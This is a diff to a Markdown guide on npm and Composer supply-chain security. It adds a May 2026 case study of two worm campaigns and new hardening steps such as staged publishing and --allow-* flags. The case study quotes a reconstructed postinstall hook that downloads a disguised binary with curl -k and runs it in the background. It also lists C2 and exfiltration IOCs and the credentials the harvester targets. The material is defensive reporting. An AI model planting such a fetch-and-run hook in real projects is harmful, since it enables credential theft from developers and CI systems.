@@ -98,12 +98,14 @@ Source: [Wiz — Mini Shai-Hulud SAP npm](https://www.wiz.io/blog/mini-shai-hulu
 
 ### GitHub's Response
 
-In direct response to Shai-Hulud and the broader npm supply chain attack pattern, GitHub published [Our plan for a more secure npm supply chain](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/). Key commitments:
+In direct response to Shai-Hulud and the broader npm supply chain attack pattern, GitHub published [Our plan for a more secure npm supply chain](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/). As of May 22, 2026, the two highest-leverage items have shipped GA:
 
-- **Staged publishing** — review window before packages go live, requires MFA-verified owner approval
-- **Granular tokens with 7-day lifetime maximum** for local publishing
-- **FIDO-based 2FA** replacing TOTP; legacy classic tokens being deprecated
-- **Bulk trusted publishing migration tooling** ([generally available February 18, 2026](https://github.blog/changelog/2026-02-18-npm-bulk-trusted-publishing-config-and-script-security-now-generally-available/))
+- **Staged publishing — GA in npm CLI 11.15.0 (May 22, 2026).** `npm stage publish` uploads to a staging queue requiring a 2FA-verified maintainer approval before the version becomes installable. See the [May 22 case study](#case-study-may-22-2026--npm-platform-hardens-two-worms-land) above and the Publishers guide Section 3 below.
+- **Install-time `--allow-*` controls — GA in npm CLI 11.15.0.** `--allow-file`, `--allow-remote`, `--allow-directory`, and `--allow-git` gate non-registry install sources. `--allow-git` default flips to `none` in npm v12.
+- **Bulk trusted publishing migration tooling** — [GA February 18, 2026](https://github.blog/changelog/2026-02-18-npm-bulk-trusted-publishing-config-and-script-security-now-generally-available/).
+- **Platform-wide token resets** — npm [invalidated every bypass-2FA granular access token](https://socket.dev/blog/npm-invalidates-tokens-mini-shai-hulud) on May 19, 2026 after the @antv compromise.
+- **Granular tokens with 7-day lifetime maximum** for local publishing — rolling out.
+- **FIDO-based 2FA** replacing TOTP; legacy classic tokens being deprecated.
 
 This is a structural change to npm publishing, not a policy update. Combined with the [GitHub Actions 2026 Security Roadmap](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) (workflow dependency locking, scoped secrets, native egress firewall), the platform is responding to the threat that Shai-Hulud demonstrated.
 
@@ -121,6 +123,116 @@ This is a structural change to npm publishing, not a policy update. Combined wit
 - [Industrial Cyber — Vect + TeamPCP RaaS alliance](https://industrialcyber.co/ransomware/vect-formalizes-breachforums-and-teampcp-alliance-to-push-model-for-industrialized-ransomware-scale-raas-operations/)
 - [GitHub Blog — Our plan for a more secure npm supply chain](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/)
 - [Hacking Passion — Bitwarden CLI Supply Chain Attack](https://hackingpassion.com/bitwarden-cli-supply-chain-attack/)
+
+---
+
+## Case Study: May 22, 2026 — npm Platform Hardens, Two Worms Land
+
+May 22, 2026 was the first day where npm's platform-level defenses against the Shai-Hulud class of attack went generally available — and on the same day, researchers disclosed two distinct compromise campaigns that those defenses would have blunted.
+
+We treat it as a single case study because the three events are causally linked: the npm response is the direct consequence of the wave that produced the postinstall-hook campaign, the Laravel Lang takeover, and the May 18 @antv compromise that finally forced npm to invalidate every bypass-2FA token in circulation.
+
+### The npm response: Staged Publishing GA + install-time controls
+
+[npm CLI 11.15.0 shipped on May 22, 2026](https://github.blog/changelog/2026-05-22-staged-publishing-and-new-install-time-controls-for-npm/) with two structural changes:
+
+1. **Staged publishing is generally available.** Instead of `npm publish` immediately exposing a tarball to consumers, `npm stage publish` uploads to a staging queue. A maintainer with a 2FA challenge must explicitly approve the staged version before it becomes installable. The queue is visible in the CLI and on npmjs.com.
+2. **`--allow-*` install-time controls for non-registry sources.** Four flags now gate where npm will pull dependencies from:
+
+   | Flag | Controls |
+   |------|----------|
+   | `--allow-file` | Local file paths and tarballs |
+   | `--allow-remote` | Remote URLs including HTTPS tarballs |
+   | `--allow-directory` | Local directories |
+   | `--allow-git` (existing) | Git sources (`github:`, `gitlab:`, `git+` URLs) |
+
+   Each flag takes `all` (current default) or `none`, and can be set on the command line, in `.npmrc`, or in `package.json`. **In npm v12, `--allow-git` defaults to `none`** — auditing your git-URL dependencies before that change ships is the cheapest hardening move available today.
+
+This is the platform response to the broader Mini Shai-Hulud campaign. Three days earlier, [npm invalidated every granular access token with write access that bypasses 2FA](https://socket.dev/blog/npm-invalidates-tokens-mini-shai-hulud) after the May 18 wave compromised 639 malicious versions across 323 packages in the `@antv` ecosystem. The full Mini Shai-Hulud campaign now spans **1,055 compromised versions across 502 packages**. The worm's pattern is consistent: scan developer machines and CI runners for npm credentials, then republish poisoned versions of every package the victim maintains.
+
+### Worm #1: Postinstall hook across 700+ GitHub repositories
+
+[Socket disclosed on May 22, 2026](https://socket.dev/blog/malicious-postinstall-hook-found-across-700-github-repos) that the same malicious `postinstall` hook had been planted across **700+ GitHub repositories**, including **8 confirmed Packagist (PHP) packages** and an unknown number of Node.js projects. The cross-ecosystem trick is the point: PHP developers reviewing `composer.json` overlook the `package.json` script that ships in the same repository.
+
+Affected packages include `devdojo/wave` (~6,400 stars, Laravel SaaS kit, 9,100+ Packagist installs combined with `devdojo/genesis`), `moritz-sauer-13/silverstripe-cms-theme`, `crosiersource/crosierlib-base`, `katanaui/katana`, and `elitedevsquad/sidecar-laravel`.
+
+**Payload behavior:**
+
+```bash
+# Reconstructed postinstall hook signature
+curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network \
+  -o /tmp/.sshd 2>/dev/null
+chmod +x /tmp/.sshd
+/tmp/.sshd &
+```
+
+Three things stand out:
+
+1. **`curl -k` (TLS verify disabled)** — a strong attack signature. No legitimate install script needs this.
+2. **`/tmp/.sshd`** — filename mimicking the SSH daemon to evade casual `ps` review.
+3. **Background execution with stderr suppression** — no integrity validation, no logs.
+
+IOCs:
+
+- GitHub account: `parikhpreyash4`
+- Malicious repository: `parikhpreyash4/systemd-network-helper-aa5c751f`
+- Payload binary: `gvfsd-network`
+- Drop path: `/tmp/.sshd`
+
+The second-stage binary was not retrieved by researchers, so the exfiltration targets remain unconfirmed — but the access patterns of the surrounding Mini Shai-Hulud waves suggest the standard credential-harvester template.
+
+### Worm #2: Laravel Lang RCE backdoor across 700+ versions
+
+[Socket and Aikido jointly disclosed](https://socket.dev/blog/laravel-lang-compromise) that an attacker with push access to the Laravel-Lang GitHub organization **force-pushed 700+ git tags across four Composer packages in a 15-minute window** on May 22–23, 2026, injecting a remote-code-execution backdoor into every historical version.
+
+Affected packages:
+
+- `laravel-lang/lang`
+- `laravel-lang/http-statuses`
+- `laravel-lang/attributes`
+- `laravel-lang/actions`
+
+The backdoor mechanism is the most interesting part: a malicious `src/helpers.php` was registered in `composer.json` under `autoload.files`. **Files in `autoload.files` are loaded automatically every time the Composer autoloader runs** — meaning the backdoor fires on every PHP request to any application that depends on the compromised packages, not just at install time. This is the Composer-side equivalent of an npm `preinstall` hook, but worse: it runs on every boot of every dependent application, not once per install.
+
+**Payload capabilities (cross-platform PHP credential harvester):**
+
+- Cloud credentials: AWS, Azure, Google Cloud, DigitalOcean, Heroku
+- Kubernetes Service Account tokens
+- HashiCorp Vault tokens and secrets
+- CI/CD secrets: Jenkins, GitLab, GitHub Actions, CircleCI
+- Browser data: Chrome, Firefox, Edge, Brave
+- Password manager vaults: 1Password, Bitwarden, LastPass, KeePass
+- SSH keys, Git credentials, `.env` files
+- VPN configurations, Docker registry tokens
+- Laravel `APP_KEY`
+- Windows Credential Manager
+
+IOCs:
+
+- C2 domain: `flipboxstudio[.]info`
+- Payload URL: `https://flipboxstudio[.]info/payload`
+- Exfiltration endpoint: `https://flipboxstudio[.]info/exfil`
+- Staging path: `sys_get_temp_dir()/.laravel_locale/`
+- Malicious file: `src/helpers.php`
+- Windows artifact: `DebugChromium.exe`
+
+**If you have any Laravel Lang version installed:** treat every host, container, CI runner, and developer machine that ran the package as compromised. Run `composer audit`, rotate every credential the harvester targets, and rebuild from clean images. Preserve logs before cleanup.
+
+### Why this matters for AI agent developers
+
+1. **`--ignore-scripts` is no longer the only defense for non-registry sources.** Pair it with `--allow-remote=none` and audit your `--allow-git` exposure before npm v12 flips that default.
+2. **Cross-ecosystem postinstall is a viable attack pattern.** If you maintain a PHP project that ships a `package.json` (for build tooling, asset pipelines, etc.), reviewing only `composer.json` misses half the install-time surface.
+3. **`autoload.files` in `composer.json` is a runtime equivalent of `preinstall`.** Audit it the same way. Anything listed there runs on every PHP request.
+4. **Staged publishing changes the publisher trust model.** If you publish npm packages from CI, switch to `npm stage publish` and require human approval — see Section 3 of the Publishers guide below.
+
+### Sources
+
+- [GitHub Changelog — Staged publishing and new install-time controls for npm](https://github.blog/changelog/2026-05-22-staged-publishing-and-new-install-time-controls-for-npm/)
+- [Socket — Malicious Postinstall Hook Found Across 700+ GitHub Repositories](https://socket.dev/blog/malicious-postinstall-hook-found-across-700-github-repos)
+- [Socket — Laravel Lang Compromised with RCE Backdoor Across 700+ Versions](https://socket.dev/blog/laravel-lang-compromise)
+- [Socket — npm Invalidates Granular Access Tokens as Mini Shai-Hulud Swells](https://socket.dev/blog/npm-invalidates-tokens-mini-shai-hulud)
+- [Phoenix Security — Laravel Lang Composer supply chain compromise](https://phoenix.security/laravel-lang-composer-supply-chain-compromise-rce-backdoor/)
+- [Wiz — Mini Shai-Hulud Strikes Again: TanStack + more packages compromised](https://www.wiz.io/blog/mini-shai-hulud-strikes-again-tanstack-more-npm-packages-compromised)
 
 ---
 
@@ -169,6 +281,19 @@ node node_modules/esbuild/install.js   # run specific scripts you trust
 
 **Important gotcha:** `--ignore-scripts` does **not** prevent code execution from git-URL dependencies (`"foo": "git+https://..."` in `package.json`). Git deps can ship arbitrary code that runs the moment you `require()` the module — no script needed. If your `package.json` has any git-URL deps, audit them separately. ([Source: Medium analysis, Feb 2026](https://thinkingthroughcode.medium.com/i-thought-ignore-scripts-made-npm-installs-safe-it-doesnt-f409b852e7c5))
 
+**npm 11.15.0 (May 22, 2026) closes most of this gap.** Four `--allow-*` flags now gate non-registry install sources: `--allow-file`, `--allow-remote`, `--allow-directory`, and the existing `--allow-git`. Each accepts `all` (current default) or `none`, and can be set in `.npmrc` or `package.json`. For a strict consumer posture:
+
+```
+# .npmrc — block every non-registry source
+ignore-scripts=true
+allow-git=none
+allow-remote=none
+allow-file=none
+allow-directory=none
+```
+
+`--allow-git=none` will become the default in npm v12. Migrating early gives you a clean exposure list of every git-URL dependency you currently rely on. ([GitHub Changelog, May 22 2026](https://github.blog/changelog/2026-05-22-staged-publishing-and-new-install-time-controls-for-npm/))
+
 ### 3. Pin exact versions
 
 ```json
@@ -183,7 +308,20 @@ Not `"^2026.3.0"` or `"~2026.3.0"`. Exact versions prevent auto-upgrading to a c
 
 **Trade-off:** You stop getting security patches automatically. Use Dependabot or Renovate to get notified of updates, review the changelog, and update manually.
 
-### 4. Run npm audit signatures
+### 4. Set a minimum release age for new versions
+
+```
+# .npmrc
+minimum-release-age=86400   # 24 hours in seconds
+```
+
+This tells npm to skip versions younger than the configured threshold. The Mini Shai-Hulud waves and the May 18 `@antv` compromise are characteristically short — the malicious version is usually pulled within hours. A 24-hour minimum release age means you never install a poisoned version during its live window, even if your lockfile auto-updates.
+
+**Trade-off:** Genuine security patches are delayed by the same window. Set lower (e.g., 4 hours) if you need faster updates, or scope this to non-critical dependencies only.
+
+This defense is most effective when paired with pinning (you control when you update) and `npm audit signatures` (you catch tampering after the fact).
+
+### 5. Run npm audit signatures
 
 ```bash
 npm audit signatures
@@ -198,7 +336,7 @@ Also verifies Sigstore provenance attestations when available — linking the pa
 
 **Important:** The npm CLI bundled with Node is frequently too old for provenance verification. Run `npm install -g npm@latest` before using this in CI.
 
-### 5. Use Socket.dev for behavioral analysis
+### 6. Use Socket.dev for behavioral analysis
 
 [Socket.dev](https://socket.dev) does deep static analysis on packages and their dependency trees, detecting 60+ compromise indicators including install scripts, network access, obfuscated code, environment variable reads, and shell access.
 
@@ -216,7 +354,7 @@ npx @socketsecurity/safe npm install   # drop-in replacement, blocks high-risk
 
 **Free for public repos.** Private repos require a paid plan.
 
-### 6. Validate lockfiles
+### 7. Validate lockfiles
 
 [lockfile-lint](https://github.com/lirantal/lockfile-lint) ensures packages are only fetched from approved registries over HTTPS:
 
@@ -228,7 +366,7 @@ npx lockfile-lint --path package-lock.json --type npm \
 
 **Protects against:** Lockfile injection attacks — a malicious contributor modifies `package-lock.json` to redirect a legitimate package name to `https://evil.example.com/malware.tgz`. Without lockfile-lint, no CI check catches this.
 
-### 7. Run npm audit for known vulnerabilities
+### 8. Run npm audit for known vulnerabilities
 
 ```bash
 npm audit                    # check for known CVEs
@@ -237,7 +375,7 @@ npm audit --audit-level=high # fail only on high/critical
 
 This checks the npm advisory database. It catches *known* vulnerabilities but not zero-day supply chain attacks (use Socket.dev for those).
 
-### 8. Use Snyk or GitHub Dependabot for continuous monitoring
+### 9. Use Snyk or GitHub Dependabot for continuous monitoring
 
 Both services monitor your dependency tree and alert on new vulnerabilities. Dependabot also opens PRs to update vulnerable packages.
 
@@ -350,7 +488,32 @@ jobs:
 
 **Gotcha:** All registration fields on npmjs.com are case-sensitive and not validated at setup time — errors only surface during publish.
 
-### 4. Restrict GITHUB_TOKEN permissions
+### 4. Use staged publishing for human approval before exposure
+
+Trusted publishing protects against stolen tokens but does **not** protect against a compromised CI pipeline that legitimately publishes a poisoned version (the exact Shai-Hulud Third Coming pattern). Staged publishing, GA in npm CLI 11.15.0 (May 22, 2026), inserts a 2FA-verified human approval step between CI and the registry.
+
+```yaml
+- run: npm stage publish --access public
+  # Tarball goes to staging queue; no consumer can install yet.
+```
+
+Then a maintainer approves the staged version from a trusted device, providing a 2FA challenge. The version becomes installable only after approval.
+
+**Recommended pairing — trusted publishing in stage-only mode:**
+
+1. Configure your npm Trusted Publisher entry on npmjs.com to allow staging only (not direct publish).
+2. CI calls `npm stage publish` non-interactively.
+3. Maintainer reviews the diff, the build log, and the provenance attestation in the npmjs.com UI.
+4. Maintainer approves with 2FA. Only now is the version live.
+
+This combination would have blocked the Bitwarden CLI compromise: even with a legitimately compromised CI pipeline, the malicious version would have sat in staging until a human maintainer approved it — and the version mismatch between `package.json` (`2026.4.0`) and embedded `build/bw.js` (`2026.3.0`) would have been visible in the approval UI.
+
+**Requirements:**
+- npm CLI 11.15.0 or newer (`npm install -g npm@latest`)
+- A trusted device with the maintainer's 2FA enrolled
+- Workflow uses `npm stage publish` instead of `npm publish`
+
+### 5. Restrict GITHUB_TOKEN permissions
 
 Apply least privilege at the workflow level:
 
@@ -367,7 +530,7 @@ jobs:
 
 This prevents a compromised step from using the token to push code, create releases, or modify other workflows.
 
-### 5. Verify after publish
+### 6. Verify after publish
 
 Add a post-publish verification step:
 
@@ -379,7 +542,7 @@ Add a post-publish verification step:
 
 This confirms the published package has valid signatures and provenance attestations.
 
-### 6. No lifecycle scripts in package.json
+### 7. No lifecycle scripts in package.json
 
 Don't include `preinstall`, `postinstall`, or `prepare` scripts in your published package. llm-safe-haven follows this rule already.
 
@@ -388,7 +551,7 @@ Lifecycle scripts are the primary vector for install-time attacks. Every securit
 - Make it safe to install with `--ignore-scripts`
 - Signal to consumers that your package doesn't run code at install time
 
-### 7. Monitor for unauthorized publishes
+### 8. Monitor for unauthorized publishes
 
 Set up alerts for unexpected publishes to your package:
 
